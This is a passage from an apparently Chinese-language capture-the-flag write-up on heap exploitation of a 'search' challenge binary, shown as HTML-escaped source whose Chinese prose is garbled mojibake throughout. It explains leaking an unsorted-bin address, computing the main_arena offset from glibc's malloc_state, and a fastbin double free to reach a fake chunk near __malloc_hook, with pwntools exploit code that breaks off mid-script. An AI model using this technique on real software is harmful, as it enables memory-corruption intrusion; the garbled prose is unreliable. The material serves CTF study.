    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Found 135: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;unsorted_bin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Delete this sentence (y/n)?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'n'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unsorted_bin&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±æ‹¿åˆ°äº†unsorted-binçš„åœ°å€ï¼Œç„¶åå°±æ˜¯è®¡ç®—main_arenaçš„åœ°å€äº†ï¼Œè¿™é‡Œéœ€è¦å¯¹ç…§æºç ï¼Œæˆ‘å…ˆç»™å‡ºæˆ‘çš„å‡½æ•°ï¼š&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main_arena_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;# lock
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;         &lt;span class=&quot;c1&quot;&gt;# flag
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# fastbins
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# top and lastremainder
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# bins[NBINS * 2 -2]
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# offset to chunk head
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;è‡³äºåŸå› æ˜¯ä¸ºå•¥ï¼Œæˆ‘ä»¬å¾—çœ‹malloc_stateç»“æ„ä½“å’Œï¼š&lt;/p&gt;
&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc_state&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/* Serialize access.  */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;__libc_lock_define&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mutex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Flags (formerly in max_fast).  */&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Set if the fastbin chunks contain recently inserted free blocks.  */&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/* Note this is a bool but not all targets support atomics on booleans.  */&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// è¿™ä¸ªæ˜¯æ–°åŠ çš„, æ‰€ä»¥ä¸ç”¨ç®¡&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;have_fastchunks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Fastbins */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;mfastbinptr&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastbinsY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NFASTBINS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Base of the topmost chunk -- not otherwise kept in a bin */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;mchunkptr&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* The remainder from the most recent split of a small request */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;mchunkptr&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;last_remainder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* Normal bins packed as described above */&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;mchunkptr&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NBINS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;å‰é¢å‡ ä¸ªå­—æ®µåº”è¯¥æ¯”è¾ƒå¥½ç†è§£ä¸»è¦æ˜¯æœ€åä¸¤è¡Œï¼š&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# bins[NBINS * 2 -2]
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# offset to chunk head
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;è¿™ä¸ªå…¶å®è¦çœ‹bins[NBINS*2-2]çš„åˆ†å¸ƒï¼Œè¿™ä¸ªæ•°ç»„æ˜¯ä¸ªchunkæŒ‡é’ˆæ•°ç»„ï¼Œå…¶æœ¬èº«ä¹Ÿè¢«å½“ä½œchunkæ¥ç”¨ï¼Œmalloc.cä¸­è®¡ç®—binsç´¢å¼•çš„å‡½æ•°æ˜¯è¿™æ ·çš„ï¼š&lt;/p&gt;
&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define bin_at(m, i) \
  (mbinptr) (((char *) &amp;amp;((m)-&amp;gt;bins[((i) - 1) * 2]))	     \
        - offsetof (struct malloc_chunk, fd))
&lt;/span&gt;  
&lt;span class=&quot;cp&quot;&gt;#define NBINS             128
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#define unsorted_chunks(M)          (bin_at (M, 1))
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;é™¤äº†ç¬¬ä¸€ä¸ª binï¼ˆunsorted binï¼‰å¤–ï¼Œåé¢çš„æ¯ä¸ª bin ä¼šå…±äº«å‰é¢çš„ bin çš„å­—æ®µï¼Œå°†å…¶è§†ä¸º malloc chunk éƒ¨åˆ†çš„ prev_size å’Œ sizeã€‚è¿™é‡Œä¹Ÿè¯´æ˜äº†ä¸€ä¸ªé—®é¢˜ï¼Œbin çš„ä¸‹æ ‡å’Œæˆ‘ä»¬æ‰€è¯´çš„ç¬¬å‡ ä¸ª bin å¹¶ä¸æ˜¯ä¸€è‡´çš„ã€‚åŒæ—¶ï¼Œbin è¡¨å¤´çš„ chunk çš„ prev_size ä¸ size å­—æ®µä¸èƒ½éšä¾¿ä¿®æ”¹ï¼Œå› ä¸ºè¿™ä¸¤ä¸ªå­—æ®µæ˜¯è¢«å…¶å®ƒ bin æ‰€åˆ©ç”¨çš„ã€‚æ‰€ä»¥å…¶å®unsorted-binå°±æ˜¯&lt;code class=&quot;highlighter-rouge&quot;&gt;bins[0]&lt;/code&gt;ï¼Œè¿™é‡Œå†™è¿™ä¸ªå‡½æ•°å…¶å®æ˜¯ä¸ºäº†ä»¥åå¤ç”¨ï¼Œæ³„æ¼smallbinå•¥çš„ä¹Ÿæœ‰å¯èƒ½ã€‚&lt;/p&gt;

&lt;p&gt;æ¥ä¸‹æ¥å°±æ˜¯æ±‚offsetï¼š&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;unsorted_bin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak_bins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;main_arena_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unsorted_bin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_arena_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_arena_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_arena_libc&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;è‡³äºè¿™ä¸ªmain_arena_libcæ˜¯æ€ä¹ˆå¼„å‡ºæ¥çš„ï¼Œå…¶å®å°±æ˜¯ç”¨idaå»libc.soé‡ŒæŸ¥&lt;code class=&quot;highlighter-rouge&quot;&gt;malloc_trim&lt;/code&gt;è¿™ä¸ªå‡½æ•°ï¼Œç„¶åç¬¬ä¸€ä¸ªifè¯­å¥é‡Œå°±æœ‰ï¼Œæºç é‡Œæ˜¯è¿™æ ·å†™çš„ï¼š&lt;/p&gt;
&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;__malloc_trim&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__malloc_initialized&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ptmalloc_init&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;mstate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ar_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main_arena&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;.......&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ä¹Ÿæ˜¯å¾ˆçƒ¦ççš„æ­¥éª¤ã€‚åˆ°è¿™é‡Œï¼Œç¬¬ä¸€å¤§æ­¥å·²ç»å®Œæˆï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ„é€ å¾ªç¯é“¾è¡¨è¦†å†™__malloc_hookã€‚&lt;/p&gt;

&lt;h4 id=&quot;double-free&quot;&gt;double free&lt;/h4&gt;
&lt;hr /&gt;

&lt;p&gt;â€ƒâ€ƒæ¥ä¸‹æ¥æˆ‘ä»¬å°±è€ƒè™‘ä½¿ç”¨double freeæ¥æ„é€ å¾ªç¯é“¾è¡¨ï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆæ„é€ ä¸‰ä¸ªå¥å­åˆ†åˆ«å½¢å¦‚ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-plain&quot;&gt;# size = 0x60
aaaaa...a d 
bbbbb...b d
ccccc...c d
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;â€ƒâ€ƒå…¶é•¿åº¦ä¸º0x60çš„åŸå› æ˜¯ä¸ºäº†æ»¡è¶³fake_chunkçš„sizeï¼Œå› ä¸ºmalloc_hooké™„è¿‘åˆé€‚fastbin-sizeçš„å­—èŠ‚å‡ ä¹åªæœ‰0x7fï¼Œæˆ‘ä»¬ä¸€ç®—&lt;code class=&quot;highlighter-rouge&quot;&gt;(0x7f&amp;gt;&amp;gt;4)-2 = 5&lt;/code&gt;ï¼Œæ‰€ä»¥0x60åŠ ä¸Šheaderåç­‰äº0x70å°±è¡Œäº†ã€‚&lt;br /&gt;
â€ƒâ€ƒæ¥ä¸‹æ¥æˆ‘ä»¬searchä¸€ä¸‹ â€œdâ€ ç„¶åæŠŠè¿™ä¸‰ä¸ªéƒ½freeæ‰ï¼Œæ­¤æ—¶fastbinçš„linkä¸º&lt;code class=&quot;highlighter-rouge&quot;&gt;a-&amp;gt;b-&amp;gt;c&lt;/code&gt;ï¼Œæ¥ç€æˆ‘ä»¬éœ€è¦é‡æ–°freeæ‰cæˆ–è€…bï¼Œå› ä¸ºaæ˜¯é“¾è¡¨å°¾ï¼Œä¼šè¢«æ£€æµ‹å‡ºdouble freeã€‚ä½†æ˜¯freeçš„æ—¶å€™ï¼Œæ­¤æ—¶cçš„fdæŒ‡é’ˆä¸ºnullï¼Œå› æ­¤åœ¨&lt;code class=&quot;highlighter-rouge&quot;&gt;if ( *(_BYTE *)v2-&amp;gt;sentence_ptr )&lt;/code&gt;è¿™ä¸€æ­¥åˆ¤æ–­çš„æ—¶å€™è¿‡ä¸äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½freeæ‰bï¼Œé‚£ä¹ˆæ­¤æ—¶çš„é“¾è¡¨ä¸ºï¼š&lt;code class=&quot;highlighter-rouge&quot;&gt;b-&amp;gt;a-&amp;gt;b-&amp;gt;c&lt;/code&gt;ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬é‡æ–°mallocå‡ºbï¼Œç„¶åå°†å…¶fdæŒ‡é’ˆä¿®æ”¹ä¸ºfake_chunkï¼Œåˆ™linkä¸º&lt;code class=&quot;highlighter-rouge&quot;&gt;a-&amp;gt;b-&amp;gt;fake_chunk&lt;/code&gt;ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å†mallocä¸¤æ¬¡æŠŠaå’Œbæ‹¿å‡ºæ¥ï¼Œå°±å¯ä»¥mallocè·å¾—fake_chunkäº†,æ‰€ä»¥å®Œæ•´çš„expä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./search&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./search&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./libc.so.6&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'tmux'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'search'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'debug'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;main_arena_libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3c4b20&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;main_arena_libc -&amp;gt; &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main_arena_libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add_sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter the sentence size:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter the sentence:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter the word size:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter the word:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;leak_bins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
